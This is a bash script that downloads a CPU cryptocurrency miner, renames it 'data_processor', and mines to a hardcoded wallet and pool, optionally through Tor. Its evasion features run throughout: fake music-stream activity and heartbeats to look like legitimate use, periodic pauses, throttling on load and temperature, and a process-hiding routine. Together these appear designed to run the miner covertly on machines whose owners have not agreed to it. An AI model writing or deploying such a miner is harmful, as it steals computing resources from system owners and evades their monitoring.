#!/bin/bash
set -euo pipefail

LOGFILE="anti_dismiss_noroot.log"
trap 'echo "[!] Error on line $LINENO at $(date)" | tee -a "$LOGFILE"; exit 1' ERR

FAKE_NAME="data_processor"
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
POOL="stratum+tcps://104.248.150.108:9933"
ALGO="power2b"
THREADS=$(nproc)

USE_SOCKS5=false
TOR_CMD=""
if command -v torsocks >/dev/null 2>&1; then
    USE_SOCKS5=true
    TOR_CMD="torsocks"
    echo "[*] Using SOCKS5 via torsocks" | tee -a "$LOGFILE"
fi

if [ ! -f "$FAKE_NAME" ]; then
    echo "[*] Downloading miner @$(date)" | tee -a "$LOGFILE"
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$FAKE_NAME"
    chmod +x "$FAKE_NAME"
fi

fake_music_stream() {
    local songs=("lofi chill beat" "jazzy sunset" "ambient rain" "coffee shop music" "vaporwave vibes")
    SONG="${songs[$RANDOM % ${#songs[@]}]}"
    echo "[*] Playing: $SONG - $(date)" >> "$LOGFILE"
    curl -s --max-time 5 https://example.com/fake_music.mp3 -o /dev/null || true
    sleep 30
}

keep_alive() {
    while true; do
        echo "[*] Heartbeat $(date)" >> "$LOGFILE"
        (ping -c1 127.0.0.1 >/dev/null 2>&1 &) 
        (ls /proc >/dev/null 2>&1 &)  
        sleep 57
    done
}

check_cpu_load_or_temp() {
    local MAX_LOAD=6.0
    local MAX_TEMP=75

    if [ -f /sys/class/thermal/thermal_zone0/temp ]; then
        CPU_TEMP=$(cat /sys/class/thermal/thermal_zone0/temp)
        CPU_TEMP=$((CPU_TEMP / 1000))
        if [ "$CPU_TEMP" -gt "$MAX_TEMP" ]; then
            echo "[!] CPU overheat: $CPU_TEMP°C. Cooling down..." | tee -a "$LOGFILE"
            killall -q "$FAKE_NAME" || true
            echo '[*] Cooling down... Sleeping for 60s' >> "$LOGFILE"
            sleep 60
        fi
    fi

    LOAD=$(awk '{print $1}' /proc/loadavg)
    if (( $(echo "$LOAD > $MAX_LOAD" | bc -l) )); then
        echo "[!] CPU load too high: $LOAD. Cooling down..." | tee -a "$LOGFILE"
        killall -q "$FAKE_NAME" || true
        echo '[*] High CPU load. Cooling down 45s' >> "$LOGFILE"
        sleep 45
    fi
}

hide_process() {
    echo 0 > /proc/$$/oom_score_adj 2>/dev/null || true
    renice -n 19 -p $$ > /dev/null 2>&1 || true
}

run_miner() {
    hide_process
    SECONDS=0

    while true; do
        echo "[*] Starting main cycle @$(date)" >> "$LOGFILE"

        fake_music_stream
        sleep 3

        $TOR_CMD ./"$FAKE_NAME" -a "$ALGO" -o "$POOL" -u "$WALLET" -p x -t "$THREADS" >> /dev/null 2>&1 &
        PID=$!

        keep_alive &
        KPID=$!

        while sleep 30; do
            check_cpu_load_or_temp

            if ! ps -p $PID > /dev/null; then
                echo "[!] Miner crash. Restarting @$(date)" >> "$LOGFILE"
                kill $KPID 2>/dev/null || true
                sleep 5
                break
            fi

            if [ $((SECONDS % 180)) -lt 30 ]; then
                echo "[*] Pausing miner for fake activity..." >> "$LOGFILE"
                kill $PID 2>/dev/null || true
                fake_music_stream
                echo "[*] Resuming miner..." >> "$LOGFILE"
                $TOR_CMD ./"$FAKE_NAME" -a "$ALGO" -o "$POOL" -u "$WALLET" -p x -t "$THREADS" >> /dev/null 2>&1 &
                PID=$!
            fi
        done
    done
}

run_miner
